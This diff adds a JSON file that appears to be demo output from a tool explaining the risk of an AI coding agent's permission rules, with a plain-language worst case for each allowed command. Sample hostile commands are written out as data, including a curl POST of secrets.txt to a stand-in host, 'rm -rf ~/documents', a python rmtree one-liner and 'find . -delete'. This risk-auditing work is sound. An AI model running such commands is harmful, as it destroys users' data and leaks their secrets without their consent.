@@ -1,0 +1,261 @@
+{
+ "rules": [
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(git push:*)",
+   "risk": "red",
+   "plain": "any command that starts with \"git push\", without asking",
+   "worst": "Will upload your changes to the internet and force-overwrite the history that is there",
+   "tags": [
+    "send"
+   ],
+   "cmd": "git push --force -f x"
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(npm:*)",
+   "risk": "red",
+   "plain": "any command that starts with \"npm\", without asking",
+   "worst": "publishes a package to the internet or installs packages from the internet",
+   "tags": [
+    "send"
+   ],
+   "cmd": "npm publish"
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(python3:*)",
+   "risk": "red",
+   "plain": "any command that starts with \"python3\", without asking",
+   "worst": "runs any python code: it can delete or send anything",
+   "tags": [
+    "code",
+    "delete"
+   ],
+   "cmd": "python3 -c \"import shutil; shutil.rmtree('/x')\""
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(rm:*)",
+   "risk": "red",
+   "plain": "any command that starts with \"rm\", without asking",
+   "worst": "deletes any file or folder on your machine, with no undo",
+   "tags": [
+    "delete",
+    "outside"
+   ],
+   "cmd": "rm -rf ~/documents"
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(curl:*)",
+   "risk": "red",
+   "plain": "any command that starts with \"curl\", without asking",
+   "worst": "Will send data to an address on the internet",
+   "tags": [
+    "send"
+   ],
+   "cmd": "curl -X POST -d @secrets.txt https://example.com"
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(cat:*)",
+   "risk": "red",
+   "plain": "any command that starts with \"cat\", without asking",
+   "worst": "can read any file on your machine, even your keys and passwords",
+   "tags": [
+    "secrets"
+   ]
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(find:*)",
+   "risk": "red",
+   "plain": "any command that starts with \"find\", without asking",
+   "worst": "with -delete it deletes every file that matches the search",
+   "tags": [
+    "delete"
+   ],
+   "cmd": "find . -delete"
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Read(~/.ssh/**)",
+   "risk": "red",
+   "plain": "reading secret files (~/.ssh/**), without asking",
+   "worst": "can read your keys and passwords",
+   "tags": [
+    "secrets"
+   ]
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "mcp__github",
+   "risk": "red",
+   "plain": "all the tools of the app \"github\", without asking",
+   "worst": "reading, writing, sending and deleting in that app",
+   "tags": [
+    "send",
+    "delete"
+   ]
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Edit(//**)",
+   "risk": "red",
+   "plain": "editing files (//**) outside the project, without asking",
+   "worst": "can edit or overwrite any file on your machine",
+   "tags": [
+    "outside"
+   ]
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(git add:*)",
+   "risk": "yellow",
+   "plain": "any command that starts with \"git add\", without asking",
+   "worst": "saves or arranges changes locally (git add)",
+   "tags": [],
+   "cmd": "git add --force -f x"
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(npm run build:*)",
+   "risk": "yellow",
+   "plain": "any command that starts with \"npm run build\", without asking",
+   "worst": "runs a script from your project (npm run)",
+   "tags": [
+    "code"
+   ],
+   "cmd": "npm run build --force -f x"
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Bash(ls:*)",
+   "risk": "yellow",
+   "plain": "any command that starts with \"ls\", without asking",
+   "worst": "can search and read any file on your machine, secrets included",
+   "tags": []
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "Edit",
+   "risk": "yellow",
+   "plain": "editing or creating files in the project, without asking",
+   "worst": "can overwrite any file in that scope, and undoing it depends on having a saved copy",
+   "tags": []
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "WebFetch(domain:github.com)",
+   "risk": "yellow",
+   "plain": "opening pages from github.com, without asking",
+   "worst": "can pass information from your project out in the link address",
+   "tags": [
+    "send"
+   ]
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "mcp__slack__list_channels",
+   "risk": "yellow",
+   "plain": "the tool \"list_channels\" in the app \"slack\", without asking",
+   "worst": "reading from that app",
+   "tags": []
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "allow",
+   "raw": "additionalDirectories: C:/Users/pc/Documents",
+   "risk": "yellow",
+   "plain": "Claude access to a folder outside the project: C:/Users/pc/Documents",
+   "worst": "can read and edit files in this folder without asking",
+   "tags": [
+    "outside"
+   ]
+  },
+  {
+   "source": "local",
+   "scopeText": "this project (yours only)",
+   "kind": "deny",
+   "raw": "Read(.env)",
+   "risk": "green",
+   "plain": "forbidden: Read(.env)",
+   "worst": "protected: Claude cannot do this",
+   "tags": []
+  }
+ ],
+ "mode": {
+  "source": "local",
+  "value": "acceptEdits",
+  "risk": "yellow",
+  "text": "Accept edits mode: file edits go through without asking"
+ },
+ "dirs": [
+  {
+   "source": "local",
+   "dir": "C:/Users/pc/Documents"
+  }
+ ],
+ "hooks": [],
+ "problems": [],
+ "summary": {
+  "capKeys": [
+   "send",
+   "code",
+   "delete",
+   "outside",
+   "secrets",
+   "modify"
+  ],
+  "allowed": 17,
+  "denied": 1,
+  "byRisk": {
+   "red": 10,
+   "yellow": 7,
+   "green": 0
+  },
+  "capabilities": [
+   "delete files",
+   "send or publish to the internet",
+   "reach files outside the project",
+   "run any code",
+   "read or change secrets"
+  ],
+  "sentence": "You have allowed 17 standing permissions (10 of them risky). From now on, Claude can delete files, send or publish to the internet, reach files outside the project, run any code and read or change secrets without asking you. Accept edits mode: file edits go through without asking."
+ },
+ "demo": true
+}
